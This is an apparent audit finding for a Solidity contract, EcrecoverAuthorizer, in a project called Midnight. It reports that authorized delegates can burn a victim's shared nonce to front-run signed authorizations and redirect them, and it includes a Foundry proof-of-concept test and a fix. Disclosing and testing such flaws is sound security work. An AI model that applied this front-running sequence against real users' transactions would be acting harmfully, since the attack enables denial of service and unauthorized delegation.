### Title
Authorized address can front-run and consume victim's EcrecoverAuthorizer nonce with arbitrary payload - (`src/periphery/EcrecoverAuthorizer.sol`)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` permits any address that `IMidnight.isAuthorized(authorizer, signer)` returns `true` for to sign and submit an `Authorization` struct on behalf of the authorizer, consuming the authorizer's nonce. Because the nonce is shared between the authorizer's own signatures and those of all currently-authorized delegates, a malicious authorized address can front-run a victim's pending authorization signature, burn nonce N with a different payload, and render the victim's signature permanently invalid.

### Finding Description
In `EcrecoverAuthorizer.setIsAuthorized` (lines 24-48 of `src/periphery/EcrecoverAuthorizer.sol`), the nonce check at line 26 increments `nonce[authorization.authorizer]` before the signer is verified. The signer check at lines 33-36 accepts either `signer == authorization.authorizer` **or** `IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)`. This means any address the victim has previously authorized in Midnight (for any purpose — taking, withdrawing, etc.) can construct an `Authorization{authorizer: victim, authorized: <any address>, isAuthorized: <any bool>, nonce: N, deadline: <any valid>}`, sign it with their own key, and call `setIsAuthorized`. The nonce check passes (N matches current nonce), the nonce is incremented to N+1, and the signer check passes because `isAuthorized(victim, attacker) == true`. The victim's pending signature over nonce N now fails with `InvalidNonce`. The attacker additionally controls what address gets authorized in the victim's name (the `authorized` field), making this both a DoS and a potential gate bypass. [1](#0-0) [2](#0-1) 

### Impact Explanation
A victim who has signed `Authorization{authorized: A, nonce: N}` and broadcast it (e.g., for a bundler flow) has their signature invalidated. The bundler flow fails. Additionally, the attacker can substitute `authorized: B` in their own submission, silently changing who gets authorized in the victim's Midnight `isAuthorized` mapping — a concrete gate bypass beyond pure DoS. [3](#0-2) 

### Likelihood Explanation
Preconditions: (1) victim has previously authorized the attacker in Midnight for any reason (a common pattern for operators/bundlers as shown in `AuthorizationTest.sol` lines 100-103), (2) victim has a pending `EcrecoverAuthorizer.setIsAuthorized` transaction in the mempool. Both conditions are routine in normal protocol usage. The attack is repeatable: after burning nonce N, the attacker can burn N+1, N+2, etc., permanently blocking the victim's ability to use the EcrecoverAuthorizer. [4](#0-3) 

### Recommendation
Restrict nonce consumption to the authorizer's own key only. Remove the `IMidnight.isAuthorized` branch from the signer check, so only `signer == authorization.authorizer` is accepted:

```solidity
require(signer == authorization.authorizer, Unauthorized());
```

If delegation is intentionally desired, use a separate nonce namespace per (authorizer, delegate) pair, or require the authorizer to co-sign any delegated authorization.

### Proof of Concept
```solidity
// Foundry unit test
function testFrontRunNonceConsumption() public {
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");
    address targetA = makeAddr("targetA");
    address targetB = makeAddr("targetB");

    // Victim authorizes attacker in Midnight (for any purpose)
    vm.prank(victim);
    midnight.setIsAuthorized(attacker, true, victim);

    // Victim also authorizes EcrecoverAuthorizer to act on their behalf
    vm.prank(victim);
    midnight.setIsAuthorized(address(ecrecoverAuthorizer), true, victim);

    // Victim signs Authorization{authorized: targetA, nonce: 0}
    Authorization memory victimAuth = Authorization({
        authorizer: victim,
        authorized: targetA,
        isAuthorized: true,
        nonce: 0,
        deadline: block.timestamp + 1 days
    });
    Signature memory victimSig = signAuthorization(victimAuth, victim);

    // Attacker front-runs: signs Authorization{authorized: targetB, nonce: 0}
    Authorization memory attackerAuth = Authorization({
        authorizer: victim,
        authorized: targetB,
        isAuthorized: true,
        nonce: 0,
        deadline: block.timestamp + 1 days
    });
    Signature memory attackerSig = signAuthorization(attackerAuth, attacker);

    // Attacker submits first — succeeds, nonce becomes 1
    ecrecoverAuthorizer.setIsAuthorized(attackerAuth, attackerSig);
    assertEq(ecrecoverAuthorizer.nonce(victim), 1);
    // targetB is now authorized, not targetA
    assertEq(midnight.isAuthorized(victim, targetB), true);
    assertEq(midnight.isAuthorized(victim, targetA), false);

    // Victim's transaction now reverts with InvalidNonce
    vm.expectRevert(IEcrecoverAuthorizer.InvalidNonce.selector);
    ecrecoverAuthorizer.setIsAuthorized(victimAuth, victimSig);
}
```

Expected assertions: attacker's call succeeds and sets `nonce(victim) == 1`; `isAuthorized(victim, targetB) == true`; `isAuthorized(victim, targetA) == false`; victim's call reverts `InvalidNonce`. [5](#0-4)
